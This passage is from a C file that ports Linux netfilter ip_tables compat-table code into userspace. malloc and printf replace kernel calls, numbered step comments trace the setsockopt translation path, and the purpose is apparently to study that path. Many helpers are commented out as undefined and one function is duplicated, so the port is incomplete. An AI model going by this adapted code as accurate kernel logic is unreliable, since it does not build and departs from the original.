	/* For purposes of check_entry casting the compat entry is fine */
	ret = check_entry((struct ipt_entry *)e);
	if (ret)
		return ret;

	off = sizeof(struct ipt_entry) - sizeof(struct compat_ipt_entry);
	entry_offset = (void *)e - (void *)base;
	j = 0;
	xt_ematch_foreach(ematch, e) {
		ret = compat_find_calc_match(ematch, name, &e->ip, &off);
		if (ret != 0)
			goto release_matches;
		++j;
	}

	t = compat_ipt_get_target(e);
	target = xt_request_find_target(NFPROTO_IPV4, t->u.user.name,
					t->u.user.revision);
	if (IS_ERR(target)) {
		printf("check_compat_entry_size_and_hooks: `%s' not found\n",
			 t->u.user.name);
		ret = PTR_ERR(target);
		goto release_matches;
	}
	t->u.kernel.target = target;

	off += xt_compat_target_offset(target);
	*size += off;
	ret = xt_compat_add_offset(AF_INET, entry_offset, off);
	if (ret)
		goto out;

	/* Check hooks & underflows */
	for (h = 0; h < NF_INET_NUMHOOKS; h++) {
		if ((unsigned char *)e - base == hook_entries[h])
			newinfo->hook_entry[h] = hook_entries[h];
		if ((unsigned char *)e - base == underflows[h])
			newinfo->underflow[h] = underflows[h];
	}

	/* Clear counters and comefrom */
	memset(&e->counters, 0, sizeof(e->counters));
	e->comefrom = 0;
	return 0;

out:
	module_put(t->u.kernel.target->me);
release_matches:
	xt_ematch_foreach(ematch, e) {
		if (j-- == 0)
			break;
		module_put(ematch->u.kernel.match->me);
	}
	return ret;
}//check_compat_entry_size_and_hooks

/**
 * @brief Source file -- .../netfilter/x_tables.c (line 657) 
 * unable to use kmalloc and vmalloc
 * 
 * @param size 
 * @return struct xt_table_info* 
 */
struct xt_table_info *xt_alloc_table_info(unsigned int size)
{
	struct xt_table_info *info = NULL;
	size_t sz = sizeof(*info) + size;

	if (sz < sizeof(*info))
		return NULL;

	/* Pedantry: prevent them from hitting BUG() in vmalloc.c --RR */	
	if ((SMP_ALIGN(size) >> PAGE_SHIFT) + 2 > totalram_pages)
		return NULL;		

	if (sz <= (PAGE_SIZE << PAGE_ALLOC_COSTLY_ORDER)){
		//info = kmalloc(sz, GFP_KERNEL | __GFP_NOWARN | __GFP_NORETRY);
		info = malloc(sz);
	}
	if (!info) {
		//info = vmalloc(sz);
		info = malloc(sz);
		if (!info)
			return NULL;
	}
	memset(info, 0, sizeof(*info));
	info->size = size;
	return info;
}//xt_alloc_table_info

/**
 * @brief  Source file -- .../netfilter/x_tables.c (line 445) 
 * vfree was replaced with free
 * 
 * @param af 
 */
void xt_compat_flush_offsets(u_int8_t af)
{
	if (xt[af].compat_tab) {
		//vfree(xt[af].compat_tab);
		free(xt[af].compat_tab);
		xt[af].compat_tab = NULL;
		xt[af].number = 0;
		xt[af].cur = 0;
	}
}//xt_compat_flush_offsets

/**
 * @brief Source file -- ip_tables.c (line 171) 
 * All zeroes == unconditional rule. 
 * Mildly perf critical (only if packet tracing is on)
 * 
 * @param e 
 * @return true 
 * @return false 
 */
static inline bool unconditional(const struct ipt_entry *e)
{
	static const struct ipt_ip uncond;

	return e->target_offset == sizeof(struct ipt_entry) &&
	       memcmp(&e->ip, &uncond, sizeof(uncond)) == 0;
#undef FWINV
}//unconditional

/**
 * @brief Source file -- ip_tables.c (line 449) 
 * 
 * duprintf changed to printf 
 *  Figures out from what hook each rule can be called: returns 0 if
   there are loops.  Puts hook bitmask in comefrom. 
 * 
 * @param newinfo 
 * @param valid_hooks 
 * @param entry0 
 * @return int 
 */
static int mark_source_chains(const struct xt_table_info *newinfo,
		   unsigned int valid_hooks, void *entry0)
{
	unsigned int hook;

	/* No recursion; use packet counter to save back ptrs (reset
	   to 0 as we leave), and comefrom to save source hook bitmask */
	for (hook = 0; hook < NF_INET_NUMHOOKS; hook++) {
		unsigned int pos = newinfo->hook_entry[hook];
		struct ipt_entry *e = (struct ipt_entry *)(entry0 + pos);

		if (!(valid_hooks & (1 << hook)))
			continue;

		/* Set initial back pointer. */
		e->counters.pcnt = pos;

		for (;;) {
			const struct xt_standard_target *t
				= (void *)ipt_get_target_c(e);
			int visited = e->comefrom & (1 << hook);

			if (e->comefrom & (1 << NF_INET_NUMHOOKS)) {
				printf("iptables: loop hook %u pos %u %08X.\n",
				       hook, pos, e->comefrom);
				return 0;
			}
			e->comefrom |= ((1 << hook) | (1 << NF_INET_NUMHOOKS));

			/* Unconditional return/END. */
			if ((unconditional(e) &&
			     (strcmp(t->target.u.user.name,
				     XT_STANDARD_TARGET) == 0) &&
			     t->verdict < 0) || visited) {
				unsigned int oldpos, size;

				if ((strcmp(t->target.u.user.name,
					    XT_STANDARD_TARGET) == 0) &&
				    t->verdict < -NF_MAX_VERDICT - 1) {
					printf("mark_source_chains: bad "
						"negative verdict (%i)\n",
								t->verdict);
					return 0;
				}

				/* Return: backtrack through the last
				   big jump. */
				do {
					e->comefrom ^= (1<<NF_INET_NUMHOOKS);
#ifdef DEBUG_IP_FIREWALL_USER
					if (e->comefrom
					    & (1 << NF_INET_NUMHOOKS)) {
						printf("Back unset "
							 "on hook %u "
							 "rule %u\n",
							 hook, pos);
					}
#endif
					oldpos = pos;
					pos = e->counters.pcnt;
					e->counters.pcnt = 0;

					/* We're at the start. */
					if (pos == oldpos)
						goto next;

					e = (struct ipt_entry *)
						(entry0 + pos);
				} while (oldpos == pos + e->next_offset);

				/* Move along one */
				size = e->next_offset;
				e = (struct ipt_entry *)
					(entry0 + pos + size);
				e->counters.pcnt = pos;
				pos += size;
			} else {
				int newpos = t->verdict;

				if (strcmp(t->target.u.user.name,
					   XT_STANDARD_TARGET) == 0 &&
				    newpos >= 0) {
					if (newpos > newinfo->size -
						sizeof(struct ipt_entry)) {
						printf("mark_source_chains: "
							"bad verdict (%i)\n",
								newpos);
						return 0;
					}
					/* This a jump; chase it. */
					printf("Jump rule %u -> %u\n",
						 pos, newpos);
				} else {
					/* ... this is a fallthru */
					newpos = pos + e->next_offset;
				}
				e = (struct ipt_entry *)
					(entry0 + newpos);
				e->counters.pcnt = pos;
				pos = newpos;
			}
		}
next:
		printf("Finished chain %u\n", hook);
	}
	return 1;
}//mark_source_chains

/**
 *  @brief unable to get the correct definition of {pcpu_alloc} in the software -- System call
 * 
 * Source file -- percpu.c (line 1078) 
 *
 * __alloc_percpu - allocate dynamic percpu area
 * @size: size of area to allocate in bytes
 * @align: alignment of area (max PAGE_SIZE)
 *
 * Equivalent to __alloc_percpu_gfp(size, align, %GFP_KERNEL).
 */
/*
void __percpu *__alloc_percpu(size_t size, size_t align)
{
	return pcpu_alloc(size, align, false, GFP_KERNEL);
}//__alloc_percpu
*/

/**
 * @brief Source file -- .../netfilter/x_tables.c (line 376) 
 * 
 * @return u64 
 */
/* On SMP, ip(6)t_entry->counters.pcnt holds address of the
 * real (percpu) counter.  On !SMP, its just the packet count,
 * so nothing needs to be done there.
 *
 * xt_percpu_counter_alloc returns the address of the percpu
 * counter, or 0 on !SMP. We force an alignment of 16 bytes
 * so that bytes/packets share a common cache line.
 *
 * Hence caller must use IS_ERR_VALUE to check for error, this
 * allows us to return 0 for single core systems without forcing
 * callers to deal with SMP vs. NONSMP issues.
 */
static inline u64 xt_percpu_counter_alloc(void)
{
	if (nr_cpu_ids > 1) {
		void __percpu *res = __alloc_percpu(sizeof(struct xt_counters),
						    sizeof(struct xt_counters));

		if (res == NULL)
			return (u64) -ENOMEM;

		return (u64) (__force unsigned long) res;
	}

	return 0;
}//xt_percpu_counter_alloc

/**
 * @brief Source file -- ../netfilter/x_tables.c (line 364) 
 * unable to find the definition of xt_check_match
 * 
 * @param par 
 * @param match_size 
 * @param proto 
 * @param invflags 
 * @return int 
 */
int xt_check_match(struct xt_mtchk_param *par,
		   unsigned int size, u_int8_t proto, bool inv_proto)
{
	
	int ret;

	if (XT_ALIGN(par->match->matchsize) != size &&
	    par->match->matchsize != -1) {
		/*
		 * ebt_among is exempt from centralized matchsize checking
		 * because it uses a dynamic-size data set.
		 */
		printf("%s_tables: %s.%u match: invalid size "
		       "%u (kernel) != (user) %u\n",
		       xt_prefix[par->family], par->match->name,
		       par->match->revision,
		       XT_ALIGN(par->match->matchsize), size);
		return -EINVAL;
	}
	if (par->match->table != NULL &&
	    strcmp(par->match->table, par->table) != 0) {
		printf("%s_tables: %s match: only valid in %s table, not %s\n",
		       xt_prefix[par->family], par->match->name,
		       par->match->table, par->table);
		return -EINVAL;
	}
	if (par->match->hooks && (par->hook_mask & ~par->match->hooks) != 0) {
		char used[64], allow[64];

		printf("%s_tables: %s match: used from hooks %s, but only "
		       "valid from %s\n",
		       xt_prefix[par->family], par->match->name,
		       textify_hooks(used, sizeof(used), par->hook_mask,
		                     par->family),
		       textify_hooks(allow, sizeof(allow), par->match->hooks,
		                     par->family));
		return -EINVAL;
	}
	if (par->match->proto && (par->match->proto != proto || inv_proto)) {
		printf("%s_tables: %s match: only valid for protocol %u\n",
		       xt_prefix[par->family], par->match->name,
		       par->match->proto);
		return -EINVAL;
	}
	if (par->match->checkentry != NULL) {
		ret = par->match->checkentry(par);
		if (ret < 0)
			return ret;
		else if (ret > 0)
			/* Flag up potential errors. */
			return -EIO;
	}
	
	return 0;

}//xt_check_match

/**
 * @brief Source file -- ip_tables.c (line 590) 
 * 
 * @param m 
 * @param par 
 * @return int 
 */
static int
check_match(struct xt_entry_match *m, struct xt_mtchk_param *par)
{
	const struct ipt_ip *ip = par->entryinfo;
	int ret;

	par->match     = m->u.kernel.match;
	par->matchinfo = m->data;

	ret = xt_check_match(par, m->u.match_size - sizeof(*m),
	      ip->proto, ip->invflags & IPT_INV_PROTO);
	if (ret < 0) {
		printf("check failed for `%s'.\n", par->match->name);
		return ret;
	}
	return 0;
}//check_match

/**
 * @brief Source file -- ip_tables.c (line 557) 
 * 
 * @param m 
 * @param net 
 */
static void cleanup_match(struct xt_entry_match *m, struct net *net)
{
	struct xt_mtdtor_param par;

	par.net       = net;
	par.match     = m->u.kernel.match;
	par.matchinfo = m->data;
	par.family    = NFPROTO_IPV4;
	if (par.match->destroy != NULL)
		par.match->destroy(&par);
	module_put(par.match->me);
	
}//cleanup_match

/**
 * @brief unable to get the correct definition of {struct pcpu_chunk kmemleak_free_percpu(), spin_lock_irqsave(), 
 * pcpu_free_area(), pcpu_chunk_addr_search(), pcpu_reserved_chunk} in the software -- System call
 * 
 * Source file -- percpu.c (line 1229)
 * 
 * @param ptr 
 */
/*
void free_percpu(void __percpu *ptr)
{
	void *addr;
	struct pcpu_chunk *chunk;
	unsigned long flags;
	int off, occ_pages;

	if (!ptr)
		return;

	kmemleak_free_percpu(ptr);

	addr = __pcpu_ptr_to_addr(ptr);

	spin_lock_irqsave(&pcpu_lock, flags);

	chunk = pcpu_chunk_addr_search(addr);
	off = addr - chunk->base_addr;

	pcpu_free_area(chunk, off, &occ_pages);

	if (chunk != pcpu_reserved_chunk)
		pcpu_nr_empty_pop_pages += occ_pages;

	/* if there are more than one fully free chunks, wake up grim reaper */
/*	if (chunk->free_size == pcpu_unit_size) {
		struct pcpu_chunk *pos;

		list_for_each_entry(pos, &pcpu_slot[pcpu_nr_slots - 1], list)
			if (pos != chunk) {
				pcpu_schedule_balance_work();
				break;
			}
	}

	spin_unlock_irqrestore(&pcpu_lock, flags);
}// free_percpu
*/


/**
 * @brief Source file -- x_tables.c (line 390)
 * 
 * unable to find the definition of xt_percpu_counter_free -- System Call
 * 
 * @param pcnt 
 */
void xt_percpu_counter_free(unsigned long long pcnt){
	
	if (nr_cpu_ids > 1)
		free_percpu((void __percpu *) (unsigned long) pcnt);
	
}//xt_percpu_counter_free

/**
 * @brief Source file -- ip_tables.c (line 631)
 * 
 * @param e 
 * @param net 
 * @param name 
 * @return int 
 */
static int check_target(struct ipt_entry *e, struct net *net, const char *name)
{
	
	struct xt_entry_target *t = ipt_get_target(e);
	struct xt_tgchk_param par = {
		.net       = net,
		.table     = name,
		.entryinfo = e,
		.target    = t->u.kernel.target,
		.targinfo  = t->data,
		.hook_mask = e->comefrom,
		.family    = NFPROTO_IPV4,
	};
	int ret;

	ret = xt_check_target(&par, t->u.target_size - sizeof(*t),
	      e->ip.proto, e->ip.invflags & IPT_INV_PROTO);
	if (ret < 0) {
		duprintf("check failed for `%s'.\n",
			 t->u.kernel.target->name);
		return ret;
	}
	
	return 0;
}//check_target

/**
 * @brief Source file -- ip_tables.c (line 1606)
 * 
 * @param e 
 * @param net 
 * @param name 
 * @return int 
 */
static int
compat_check_entry(struct ipt_entry *e, struct net *net, const char *name)
{
	struct xt_entry_match *ematch;
	struct xt_mtchk_param mtpar;
	unsigned int j;
	int ret = 0;

	e->counters.pcnt = xt_percpu_counter_alloc();
	if (IS_ERR_VALUE(e->counters.pcnt))
		return -ENOMEM;

	j = 0;
	mtpar.net	= net;
	mtpar.table     = name;
	mtpar.entryinfo = &e->ip;
	mtpar.hook_mask = e->comefrom;
	mtpar.family    = NFPROTO_IPV4;
	xt_ematch_foreach(ematch, e) {
		ret = check_match(ematch, &mtpar);
		if (ret != 0)
			goto cleanup_matches;
		++j;
	}

	ret = check_target(e, net, name);
	if (ret)
		goto cleanup_matches;
	return 0;

 cleanup_matches:
	xt_ematch_foreach(ematch, e) {
		if (j-- == 0)
			break;
		cleanup_match(ematch, net);
	}

	xt_percpu_counter_free(e->counters.pcnt);

	return ret;
}//compat_check_entry

/**
 * @brief Source file -- ip_tables.c (line 1464)
 * 
 * @param e 
 */
static void compat_release_entry(struct compat_ipt_entry *e)
{
	struct xt_entry_target *t;
	struct xt_entry_match *ematch;

	/* Cleanup all matches */
	xt_ematch_foreach(ematch, e)
		module_put(ematch->u.kernel.match->me);
	t = compat_ipt_get_target(e);
	module_put(t->u.kernel.target->me);
}//compat_release_entry


/**
 * @brief unable to get the correct definition of {stuct xt_tgdtor_param} in the software -- System call
 * 
 * Source file -- ip_tables.c (line 781) * 
 * 
 * @param e 
 * @param net 
 */
/*
static void cleanup_entry(struct ipt_entry *e, struct net *net)
{

	struct xt_tgdtor_param par;
	struct xt_entry_target *t;
	struct xt_entry_match *ematch;

	/* Cleanup all matches *//*
	xt_ematch_foreach(ematch, e)
		cleanup_match(ematch, net);
	t = ipt_get_target(e);

	par.net      = net;
	par.target   = t->u.kernel.target;
	par.targinfo = t->data;
	par.family   = NFPROTO_IPV4;
	if (par.target->destroy != NULL)
		par.target->destroy(&par);
	module_put(par.target->me);
	xt_percpu_counter_free(e->counters.pcnt);
	
}//cleanup_entry
*/

/**
 * @brief unable to get the correct definition of {kvfree()} in the software -- System call
 * 
 * Source file -- x_tables.c (line 682)
 * 
 * @param info 
 */
/*
void xt_free_table_info(struct xt_table_info *info)
{
	int cpu;

	if (info->jumpstack != NULL) {
		for_each_possible_cpu(cpu)
			kvfree(info->jumpstack[cpu]);			
			
		kvfree(info->jumpstack);
	}

	kvfree(info);

}//xt_free_table_info
*/

/////////////////////////////////////////////////////////////////////////////
//////////////////////////////// STEP 1 LOOKUP /////////////////////////////
/**
 * @brief unable to get the correct definition of {struct file, struct socket_file_ops} in the software -- System call
 * 
 * Source file -- socket.c (line 408)
 * 
 * @param file 
 * @param err 
 * @return struct socket* 
 */
/*
struct socket *sock_from_file(struct file *file, int *err)
{
	
	if (file->f_op == &socket_file_ops)
		return file->private_data;	/* set in sock_map_fd */

/*	*err = -ENOTSOCK;
	return NULL;
	
}//sock_from_file
*/

/**
 * @brief unable to get the correct definition of {rcu_dereference_raw()} in the software -- System call
 * 
 * Source file -- fdtable.h (line 80)
 * 
 * The caller must ensure that fd table isn't shared or hold rcu or file lock
 * 
 * @param files 
 * @param fd 
 * @return struct file* 
 */
/*
static inline struct file *__fcheck_files(struct files_struct *files, unsigned int fd)
{
	struct fdtable *fdt = rcu_dereference_raw(files->fdt);

	if (fd < fdt->max_fds)
		return rcu_dereference_raw(fdt->fd[fd]);
	return NULL;
	
}//__fcheck_files
*/

/**
 * @brief  unable to get the correct definition of {current = get_current(), file, atomic_read(), unlikely, FDPUT_FPUT} in the software -- System call
 * 
 * Source file -- file.c (line 745)
 * 
 * @param fd 
 * @param mask 
 * @return unsigned 
 */
/*
 * Lightweight file lookup - no refcnt increment if fd table isn't shared.
 *
 * You can use this instead of fget if you satisfy all of the following
 * conditions:
 * 1) You must call fput_light before exiting the syscall and returning control
 *    to userspace (i.e. you cannot remember the returned struct file * after
 *    returning to userspace).
 * 2) You must not call filp_close on the returned struct file * in between
 *    calls to fget_light and fput_light.
 * 3) You must not clone the current task in between the calls to fget_light
 *    and fput_light.
 *
 * The fput_needed flag returned by fget_light should be passed to the
 * corresponding fput_light.
 */
/*
static unsigned long __fget_light(unsigned int fd, fmode_t mask)
{
	
	struct files_struct *files = current->files;
	struct file *file;

	if (atomic_read(&files->count) == 1) {
		file = __fcheck_files(files, fd);
		if (!file || unlikely(file->f_mode & mask))
			return 0;
		return (unsigned long)file;
	} else {
		file = __fget(fd, mask);
		if (!file)
			return 0;
		return FDPUT_FPUT | (unsigned long)file;
	}
	
}//__fget_light
*/

/**
 * @brief Source file -- file.h (line 48)
 * 
 * @param v 
 * @return struct fd 
 */
static inline struct fd __to_fd(unsigned long v)
{
	return (struct fd){(struct file *)(v & ~3),v & 3};
}//__to_fd

/**
 * @brief Source file -- file.c (line 762)
 * 
 * @param fd 
 * @return unsigned 
 */
unsigned long __fdget(unsigned int fd)
{
	return __fget_light(fd, FMODE_PATH);
}//__fdget

/**
 * @brief Source file -- file.h (line 53)
 * 
 * @param fd 
 * @return struct fd 
 */
static inline struct fd fdget(unsigned int fd)
{
	return __to_fd(__fdget(fd));
}//fdget

/**
 * @brief unable to get the correct definition of {struct file, atomic_long_dec_and_test(), llist_add} in the software -- System call
 * 
 * Source file -- file_table.c (line 264)
 * 
 * @param file 
 */
/*
void fput(struct file *file)
{
	
	if (atomic_long_dec_and_test(&file->f_count)) {
		struct task_struct *task = current;

		if (likely(!in_interrupt() && !(task->flags & PF_KTHREAD))) {
			init_task_work(&file->f_u.fu_rcuhead, ____fput);
			if (!task_work_add(task, &file->f_u.fu_rcuhead, true))
				return;
			/*
			 * After this task has run exit_task_work(),
			 * task_work_add() will fail.  Fall through to delayed
			 * fput to avoid leaking *file.
			 */
/*		}

		if (llist_add(&file->f_u.fu_llist, &delayed_fput_list))
			schedule_delayed_work(&delayed_fput_work, 1);
	}
	
}//fput
*/

/**
 * @brief Source file -- file.h (line 36)
 * 
 * @param fd 
 */
static inline void fdput(struct fd fd)
{
	if (fd.flags & FDPUT_FPUT)
		fput(fd.file);
}//fdput

/**
 * @brief Source file -- socket.c (line 449)
 * 
 * @param fd 
 * @param err 
 * @param fput_needed 
 * @return struct socket* 
 */
static struct socket *sockfd_lookup_light(int fd, int *err, int *fput_needed)
{
	struct fd f = fdget(fd);
	struct socket *sock;

	*err = -EBADF;
	if (f.file) {
		sock = sock_from_file(f.file, err);
		if (likely(sock)) {
			*fput_needed = f.flags;
			return sock;
		}
		fdput(f);
	}
	return NULL;

}//sockfd_lookup_light

/**
 * @brief 
 * 
 * @param sock 
 * @param level 
 * @param optname 
 * @return int 
 */
int security_socket_setsockopt(struct socket *sock, int level, int optname)
{
	return call_int_hook(socket_setsockopt, 0, sock, level, optname);
}//security_socket_setsockopt

/**
 * @brief Source file -- file.h (line 23)
 * 
 * @param file 
 * @param fput_needed 
 */
static inline void fput_light(struct file *file, int fput_needed)
{
	if (fput_needed)
		fput(file);
}//fput_light

/**
 * @brief unable to get the definition of system parameters {CONFIG_NET_NS, &init_net} in the software -- System call
 * 
 * Source file -- net_namespace.h (line 256)
 * 
 * @param pnet 
 * @return struct net* 
 */
/*
static inline struct net *read_pnet(const possible_net_t *pnet)
{
	#ifdef CONFIG_NET_NS
		return pnet->net;
	#else
		return &init_net;
	#endif
}//read_pnet
*/

/**
 * @brief Source file -- sock.h (line 2089)
 * 
 * @param sk 
 * @return struct net* 
 */
static inline
struct net *sock_net(const struct sock *sk)
{
	return read_pnet(&sk->sk_net);
}//sock_net

/////////////////////////////// END STEP 1 LOOKUP /////////////////////////


/**
 * @brief Source file -- x_tables.c (line 602)
 * ============ Step 5 ===============
 * 
 * @param t 
 * @param dstptr 
 * @param size 
 */
void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,
				unsigned int *size)
{
	const struct xt_target *target = t->u.kernel.target;
	struct compat_xt_entry_target *ct = (struct compat_xt_entry_target *)t;
	int pad, off = xt_compat_target_offset(target);
	u_int16_t tsize = ct->u.user.target_size;

	t = *dstptr;
	memcpy(t, ct, sizeof(*ct));
	if (target->compat_from_user)
		target->compat_from_user(t->data, ct->data);
	else
		memcpy(t->data, ct->data, tsize - sizeof(*ct));
	pad = XT_ALIGN(target->targetsize) - target->targetsize;
	if (pad > 0)
		memset(t->data + target->targetsize, 0, pad);

	tsize += off;
	t->u.user.target_size = tsize;

	*size += off;
	*dstptr += tsize;
}//xt_compat_target_from_user

/**
 * @brief Source file -- x_tables.c (line 474)
 * 
 * @param af 
 * @param number 
 */
void xt_compat_init_offsets(u_int8_t af, unsigned int number)
{
	xt[af].number = number;
	xt[af].cur = 0;
}//xt_compat_init_offsets


/**
 * @brief Source file -- compat.h (line 226)
 * 
 * @param uptr 
 * @return void* 
 */
/*
 * A pointer passed in from user mode. This should not
 * be used for syscall parameters, just declare them
 * as pointers because the syscall entry code will have
 * appropriately converted them already.
 */
static inline void __user *compat_ptr(compat_uptr_t uptr)
{
	return (void __user *)(unsigned long)uptr;
}//compat_ptr

/**
 * @brief Source file -- x_tables.c (line 818)
 * 
 * @param table 
 * @param num_counters 
 * @param newinfo 
 * @param error 
 * @return struct xt_table_info* 
 */
struct xt_table_info * xt_replace_table(struct xt_table *table,
	      unsigned int num_counters,
	      struct xt_table_info *newinfo,
	      int *error)
{
	struct xt_table_info *private;
	int ret;

	ret = xt_jumpstack_alloc(newinfo);
	if (ret < 0) {
		*error = ret;
		return NULL;
	}

	/* Do the substitution. */
	local_bh_disable();
	private = table->private;

	/* Check inside lock: is the old number correct? */
	if (num_counters != private->number) {
		pr_debug("num_counters != table->private->number (%u/%u)\n",
			 num_counters, private->number);
		local_bh_enable();
		*error = -EAGAIN;
		return NULL;
	}

	newinfo->initial_entries = private->initial_entries;
	/*
	 * Ensure contents of newinfo are visible before assigning to
	 * private.
	 */
	smp_wmb();
	table->private = newinfo;

	/*
	 * Even though table entries have now been swapped, other CPU's
	 * may still be using the old entries. This is okay, because
	 * resynchronization happens because of the locking done
	 * during the get_counters() routine.
	 */
	local_bh_enable();

#ifdef CONFIG_AUDIT
	if (audit_enabled) {
		struct audit_buffer *ab;

		ab = audit_log_start(current->audit_context, GFP_KERNEL,
				     AUDIT_NETFILTER_CFG);
		if (ab) {
			audit_log_format(ab, "table=%s family=%u entries=%u",
					 table->name, table->af,
					 private->number);
			audit_log_end(ab);
		}
	}
#endif

	return private;
}//xt_replace_table

/**
 * @brief Comprehensive definition of per_cpu() not found
 * 
 * Source file -- ip_tables.c (line 886)
 * 
 * Get the counters object
 * 
 * @param t 
 * @param counters 
 */
/*
static void get_counters(const struct xt_table_info *t,
	     struct xt_counters counters[])
{
	struct ipt_entry *iter;
	unsigned int cpu;
	unsigned int i;

	for_each_possible_cpu(cpu) {
		seqcount_t *s = &per_cpu(xt_recseq, cpu);

		i = 0;
		xt_entry_foreach(iter, t->entries, t->size) {
			struct xt_counters *tmp;
			u64 bcnt, pcnt;
			unsigned int start;

			tmp = xt_get_per_cpu_counter(&iter->counters, cpu);
			do {
				start = read_seqcount_begin(s);
				bcnt = tmp->bcnt;
				pcnt = tmp->pcnt;
			} while (read_seqcount_retry(s, start));

			ADD_COUNTER(counters[i], bcnt, pcnt);
			++i; /* macro does multi eval of i */
/*		}
	}
}//get_counters
*/

/**
 * @brief unable to get the correct definition of {per_cpu()} in the software -- system calls
 * 
 * Source file -- ip_tables.c (line 886) 
 * 
 * @param t 
 * @param counters 
 */
/*
static void get_counters(const struct xt_table_info *t,
	     struct xt_counters counters[])
{
	struct ipt_entry *iter;
	unsigned int cpu;
	unsigned int i;

	for_each_possible_cpu(cpu) {
		seqcount_t *s = &per_cpu(xt_recseq, cpu);

		i = 0;
		xt_entry_foreach(iter, t->entries, t->size) {
			struct xt_counters *tmp;
			u64 bcnt, pcnt;
			unsigned int start;

			tmp = xt_get_per_cpu_counter(&iter->counters, cpu);
			do {
				start = read_seqcount_begin(s);
				bcnt = tmp->bcnt;
				pcnt = tmp->pcnt;
			} while (read_seqcount_retry(s, start));

			ADD_COUNTER(counters[i], bcnt, pcnt);
			++i; /* macro does multi eval of i */
/*		}
	}
}
*/

/**
 * @brief unable to get the correct definition of {schedule_work(), __vunmap()} in the software -- system calls
 * 
 * Source file -- vmalloc.c (line 1502) 
 * 
 * @param addr 
 */
/*
void vfree(const void *addr)
{
	BUG_ON(in_nmi());

	kmemleak_free(addr);

	if (!addr)
		return;
	if (unlikely(in_interrupt())) {
		struct vfree_deferred *p = this_cpu_ptr(&vfree_deferred);
		if (llist_add((struct llist_node *)addr, &p->list))
			schedule_work(&p->wq);
	} else
		__vunmap(addr, 1);
}//vfree
*/

/**
 * @brief unable to get the correct definition of {xt_table_unlock()} in the software -- system calls
 * 
 * @param t 
 */
/*
void xt_table_unlock(struct xt_table *t){

}//xt_table_unlock
*/

/**
 * @brief unable to get the correct definition of {get_counters(), copy_to_user(), vfree(), xt_table_unlock()} in the software -- system calls
 * 
 * Source file -- ip_tables.c (line 1181) 
 * 
 * @param net 
 * @param name 
 * @param valid_hooks 
 * @param newinfo 
 * @param num_counters 
 * @param counters_ptr 
 * @return int 
 */
static int __do_replace(struct net *net, const char *name, unsigned int valid_hooks,
	     struct xt_table_info *newinfo, unsigned int num_counters,
	     void __user *counters_ptr)
{
	int ret;
	struct xt_table *t;
	struct xt_table_info *oldinfo;
	struct xt_counters *counters;
	struct ipt_entry *iter;

	ret = 0;
	counters = vzalloc(num_counters * sizeof(struct xt_counters));
	if (!counters) {
		ret = -ENOMEM;
		goto out;
	}

	t = try_then_request_module(xt_find_table_lock(net, AF_INET, name),
				    "iptable_%s", name);
	if (IS_ERR_OR_NULL(t)) {
		ret = t ? PTR_ERR(t) : -ENOENT;
		goto free_newinfo_counters_untrans;
	}

	/* You lied! */
	if (valid_hooks != t->valid_hooks) {
		printf("Valid hook crap: %08X vs %08X\n",
			 valid_hooks, t->valid_hooks);
		ret = -EINVAL;
		goto put_module;
	}

	oldinfo = xt_replace_table(t, num_counters, newinfo, &ret);
	if (!oldinfo)
		goto put_module;

	/* Update module usage count based on number of rules */
	printf("do_replace: oldnum=%u, initnum=%u, newnum=%u\n",
		oldinfo->number, oldinfo->initial_entries, newinfo->number);
	if ((oldinfo->number > oldinfo->initial_entries) ||
	    (newinfo->number <= oldinfo->initial_entries))
		module_put(t->me);
	if ((oldinfo->number > oldinfo->initial_entries) &&
	    (newinfo->number <= oldinfo->initial_entries))
		module_put(t->me);

	/* Get the old counters, and synchronize with replace */
	get_counters(oldinfo, counters);

	/* Decrease module usage counts and free resource */
	xt_entry_foreach(iter, oldinfo->entries, oldinfo->size)
		cleanup_entry(iter, net);

	xt_free_table_info(oldinfo);
	if (copy_to_user(counters_ptr, counters,
			 sizeof(struct xt_counters) * num_counters) != 0) {
		/* Silent error, can't fail, new table is already in place */
		net_warn_ratelimited("iptables: counters copy to user failed while replacing table\n");
	}
	vfree(counters);
	xt_table_unlock(t);
	return ret;

 put_module:
	module_put(t->me);
	xt_table_unlock(t);
 free_newinfo_counters_untrans:
	vfree(counters);
 out: 
	return ret;
} //__do_replace


/**
 * @brief Source file -- ip_tables.c (line 1565)
 * =========== Step 4 ==============
 * 
 * @param e 
 * @param dstptr 
 * @param size 
 * @param name 
 * @param newinfo 
 * @param base 
 * @return int 
 */
static int compat_copy_entry_from_user(struct compat_ipt_entry *e, void **dstptr,
			    unsigned int *size, const char *name,
			    struct xt_table_info *newinfo, unsigned char *base)
{
	struct xt_entry_target *t;
	struct xt_target *target;
	struct ipt_entry *de;
	unsigned int origsize;
	int ret, h;
	struct xt_entry_match *ematch;

	ret = 0;
	origsize = *size;
	de = (struct ipt_entry *)*dstptr;
	memcpy(de, e, sizeof(struct ipt_entry));
	memcpy(&de->counters, &e->counters, sizeof(e->counters));

	*dstptr += sizeof(struct ipt_entry);
	*size += sizeof(struct ipt_entry) - sizeof(struct compat_ipt_entry);

	xt_ematch_foreach(ematch, e) {
		ret = xt_compat_match_from_user(ematch, dstptr, size);
		if (ret != 0)
			return ret;
	}
	de->target_offset = e->target_offset - (origsize - *size);
	t = compat_ipt_get_target(e);
	target = t->u.kernel.target;
	xt_compat_target_from_user(t, dstptr, size);

	de->next_offset = e->next_offset - (origsize - *size);
	for (h = 0; h < NF_INET_NUMHOOKS; h++) {
		if ((unsigned char *)de - base < newinfo->hook_entry[h])
			newinfo->hook_entry[h] -= origsize - *size;
		if ((unsigned char *)de - base < newinfo->underflow[h])
			newinfo->underflow[h] -= origsize - *size;
	}
	return ret;
}//compat_copy_entry_from_user

/** Source file -- ip_tables.c (line 1648)
 * @brief 
 * ============== Step 3 ===============
 * 
 * @param net 
 * @param name 
 * @param valid_hooks 
 * @param pinfo 
 * @param pentry0 
 * @param total_size 
 * @param number 
 * @param hook_entries 
 * @param underflows 
 * @return int 
 */
static int translate_compat_table(struct net *net,
		       const char *name,
		       unsigned int valid_hooks,
		       struct xt_table_info **pinfo,
		       void **pentry0,
		       unsigned int total_size,
		       unsigned int number,
		       unsigned int *hook_entries,
		       unsigned int *underflows)
{
	unsigned int i, j;
	struct xt_table_info *newinfo, *info;
	void *pos, *entry0, *entry1;
	struct compat_ipt_entry *iter0;
	struct ipt_entry *iter1;
	unsigned int size;
	int ret;

	info = *pinfo;
	entry0 = *pentry0;
	size = total_size;
	info->number = number;

	/* Init all hooks to impossible value. */
	for (i = 0; i < NF_INET_NUMHOOKS; i++) {
